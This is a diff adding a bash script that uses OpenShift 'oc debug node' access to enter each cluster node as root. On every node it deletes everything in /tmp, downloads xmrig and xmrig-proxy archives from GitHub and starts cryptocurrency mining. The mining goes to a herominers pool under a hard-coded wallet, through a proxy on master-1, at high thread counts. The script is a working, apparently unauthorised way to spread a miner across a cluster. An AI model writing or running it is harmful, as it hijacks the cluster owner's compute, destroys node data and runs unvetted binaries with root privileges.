@@ -1,0 +1,81 @@
+#!/bin/bash
+
+nodes=($(<hosts_bkp))
+
+for node in "${nodes[@]}"; do
+  echo "Starting debug session for node: $node"
+
+  if [[ "$node" == "master-1" ]]; then
+    # Master-1: Run proxy + light mining (6 threads)
+    oc debug node/$node <<EOF
+      chroot /host
+      echo "Entering chroot environment on $node (proxy + miner)"
+      su -
+      cd /tmp
+      rm -rf *
+      pkill -9 xmrig
+
+      # Download xmrig-proxy (from official repo)
+      curl -L -O https://github.com/xmrig/xmrig-proxy/releases/download/v6.22.0/xmrig-proxy-6.22.0-linux-static-x64.tar.gz	
+      tar --no-same-owner -xzvf xmrig-proxy-6.22.0-linux-static-x64.tar.gz
+
+	  
+	  # Download xmrig (from official repo)
+      curl -L -O https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+      tar --no-same-owner -xzvf xmrig-6.22.2-linux-static-x64.tar.gz
+
+
+      # Enable huge pages
+      echo 4096 > /proc/sys/vm/nr_hugepages
+      sysctl -p
+       
+      # Start proxy
+	  cd xmrig-proxy-6.22.0
+      ./xmrig-proxy -a rx/0 -o de.salvium.herominers.com:1230 -u solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa -u ERR404 -k --tls -b 0.0.0.0:3333 -B -S --log-file=xmrig-proxy.log 
+		
+		
+      # Start xmrig mining (light, 6 threads)
+	  cd -
+	  curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz
+      tar -xzvf xmrig-6.22.2-linux-static-x64.tar.gz
+
+      exit
+      exit
+      exit
+EOF
+
+  else
+    # Other nodes: Miner pointing to proxy on master-1
+    oc debug node/$node <<EOF
+      chroot /host
+      echo "Entering chroot environment on $node"
+      su -
+      cd /tmp
+      rm -rf *
+      pkill -9 xmrig
+
+      # Download xmrig from Kryptex fork
+      curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz
+      tar -xzvf xmrig-6.22.2-linux-static-x64.tar.gz
+
+      # Enable huge pages
+      echo 4096 > /proc/sys/vm/nr_hugepages
+      sysctl -p
+
+      # Start xmrig miner pointing to proxy on master-1
+      nohup ./xmrig -a rx/0 -o 192.168.252.11:3333 -u cluster --tls -k --huge-pages --threads=32 --cpu-priority=5 --donate-level=0 --syslog --print-time=10 > xmrig.log 2>&1 &
+
+      exit
+      exit
+      exit
+EOF
+  fi
+
+  echo "Completed debug session for node: $node"
+done
+
+echo "All nodes processed."
+
+
+
+
